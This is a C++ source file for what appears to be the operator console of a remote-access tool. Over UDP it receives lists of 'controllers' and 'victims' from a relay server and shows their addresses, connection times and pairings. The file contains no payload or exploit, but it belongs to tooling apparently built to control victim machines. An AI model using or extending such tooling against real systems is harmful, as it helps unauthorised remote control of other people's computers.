#include "controller.h"
#include <iostream>
#include <sstream>

Controller::Controller(sf::UdpSocket& s)
    :
    socket(s)
{
}

void Controller::receiveInfo()
{
    while (true)
    {
        size_t size;
        sf::IpAddress ip;
        unsigned short port;
        char msg[50];
        socket.receive(msg, sizeof(msg), size, ip, port);
        if (ip != SERVER_IP || port != SERVER_PORT)
            continue;

        //reset clients info
        if (msg[0] == 'e')
        {
            controllers.clear();
            victims.clear();
        }
        //add new controller info
        else if (msg[0] == 'n')
        {
            std::stringstream ss(msg);
            ss.ignore(1);
            std::string buf;
            Client c;

            getline(ss, buf, ';');
            c.ip = buf;
            getline(ss, buf, ';');
            c.otherIp = buf;
            getline(ss, buf, ';');
            c.port = stoi(buf);
            getline(ss, buf, ';');
            c.otherPort = stoi(buf);
            ss >> c.connectionTime;

            controllers.push_back(c);
        }
        //add new victim info
        else if (msg[0] == 'l')
        {
            std::stringstream ss(msg);
            ss.ignore(1);
            std::string buf;
            Client v;

            getline(ss, buf, ';');
            v.ip = buf;
            getline(ss, buf, ';');
            v.otherIp = buf;
            getline(ss, buf, ';');
            v.port = stoi(buf);
            getline(ss, buf, ';');
            v.otherPort = stoi(buf);
            ss >> v.connectionTime;

            victims.push_back(v);
        }
        //display clients info
        else if (msg[0] == 'd')
        {
            system("CLS");
            std::cout << "CONTROLLERS:\n";
            for (int i = 0; i < controllers.size(); i++)
            {
                std::cout << "  " << i << ".  " << controllers[i].ip << ':' << controllers[i].port;
                std::cout << " - time: " << controllers[i].connectionTime << " - ";
                if (controllers[i].otherIp == "-")
                    std::cout << "not paired\n";
                else
                    std::cout << "paired with: " << controllers[i].otherIp << ':' << controllers[i].otherPort << '\n';
            }
            std::cout << "VICTIMS:\n";
            for (int i = 0; i < victims.size(); i++)
            {
                std::cout << "  " << i << ".  " << victims[i].ip << ':' << victims[i].port;
                std::cout << " - time: " << victims[i].connectionTime << " - ";
                if (victims[i].otherIp == "-")
                    std::cout << "not paired\n";
                else
                    std::cout << "paired with: " << victims[i].otherIp << ':' << victims[i].otherPort << '\n';
            }
            std::cout << '\n';
        }
    }
}
